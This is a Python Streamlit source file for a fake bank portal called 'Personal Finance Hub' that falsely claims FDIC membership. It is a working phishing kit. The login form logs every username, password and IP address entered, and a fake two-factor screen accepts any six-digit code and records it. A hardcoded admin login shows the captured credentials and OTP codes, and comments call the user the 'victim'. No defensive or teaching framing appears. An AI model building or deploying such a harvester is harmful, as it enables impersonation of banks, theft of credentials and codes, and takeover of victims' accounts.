import streamlit as st
import pandas as pd
from datetime import datetime, timedelta

# ========================= CONFIG =========================
st.set_page_config(page_title="Personal Finance Hub", page_icon="🏦", layout="wide")

# ========================= STORAGE =========================
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []

# ========================= CREDENTIALS =========================
VALID_USERNAME = "client001"
VALID_PASSWORD = "Secure2025Hub!"
ADMIN_USER = "admin"
ADMIN_PASS = "showme2025"

# ========================= SESSION STATE =========================
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False
if "otp_verified" not in st.session_state:
    st.session_state.otp_verified = False
if "attempts" not in st.session_state:
    st.session_state.attempts = 0

def get_ip():
    try:
        return st.context.headers.get("X-Forwarded-For", "Unknown").split(',')[0]
    except:
        return "Unknown"

# ========================= LOGIN PAGE (with harvester) =========================
def login_page():
    st.markdown("<style>.stApp {background: linear-gradient(135deg, #0f1b3d 0%, #1a2a6c 100%); color: white;}</style>", unsafe_allow_html=True)
    st.markdown("<div style='text-align:center; padding-top:80px'>", unsafe_allow_html=True)
    st.markdown("<h1 style='color:white; font-size:50px'>🏦 Personal Finance Hub</h1>", unsafe_allow_html=True)
    st.markdown("<p style='color:#aaa'>Secure Client Portal • Member FDIC</p>", unsafe_allow_html=True)

    username = st.text_input("Username / Client ID", placeholder="client001")
    password = st.text_input("Password", type="password", placeholder="Enter password")

    if st.button("Sign In Securely", type="primary"):
        # Capture everything
        st.session_state.captured_creds.append({
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": username,
            "password": password,
            "ip": get_ip()
        })

        if username == VALID_USERNAME and password == VALID_PASSWORD:
            st.session_state.authenticated = True
            st.session_state.otp_verified = False  # Force OTP screen
            st.rerun()
        elif username == ADMIN_USER and password == ADMIN_PASS:
            st.session_state.authenticated = True
            st.session_state.is_admin = True
            st.rerun()
        else:
            st.error("Invalid credentials")

# ========================= FAKE OTP / 2FA SCREEN =========================
def otp_page():
    st.markdown("<style>.stApp {background: #f8f9fa;}</style>", unsafe_allow_html=True)
    st.markdown("<div style='text-align:center; padding:80px 20px'>", unsafe_allow_html=True)
    st.markdown("<h1>🔐 Two-Factor Authentication Required</h1>", unsafe_allow_html=True)
    st.markdown("<p>We sent a 6-digit code to your registered phone ending in **--7842 and email a**@gmail.com</p>", unsafe_allow_html=True)
    st.markdown("<h3>Enter code below</h3>", unsafe_allow_html=True)

    code = st.text_input("Verification Code", max_chars=6, placeholder="000000", label_visibility="collapsed")

    if st.button("Verify & Continue", type="primary"):
        # Capture the OTP they typed
        st.session_state.captured_otp.append({
            "time": datetime.now().strftime("%H:%M:%S"),
            "otp_entered": code,
            "ip": get_ip()
        })
        # Accept ANY 6-digit code
        if len(code) == 6 and code.isdigit():
            st.session_state.otp_verified = True
            st.success("Verification successful!")
            st.balloons()
            st.rerun()
        else:
            st.error("Invalid code. Try again.")

    # Fake countdown
    st.markdown("<p style='color:gray'>Code expires in <b>4:59</b></p>", unsafe_allow_html=True)

# ========================= ADMIN VIEW =========================
def admin_view():
    st.error("ADMIN MODE — CAPTURED DATA")
    if st.session_state.captured_creds:
        st.subheader("Captured Logins")
        st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    if st.session_state.captured_otp:
        st.subheader("Captured OTP Codes")
        st.dataframe(pd.DataFrame(st.session_state.captured_otp))

# ========================= DASHBOARD (victim sees) =========================
def dashboard():
    st.success("Welcome back! Your account is now fully unlocked.")
    st.markdown("<h1 style='text-align:center; color:#00c4ff'>Secure Dashboard</h1>", unsafe_allow_html=True)
    st.metric("Total Balance", "$27,451.82", "+$5,200")
    # Add the rest of your dashboard here later

# ========================= MAIN LOGIC =========================
if not st.session_state.authenticated:
    login_page()
elif st.session_state.get("is_admin"):
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    dashboard()
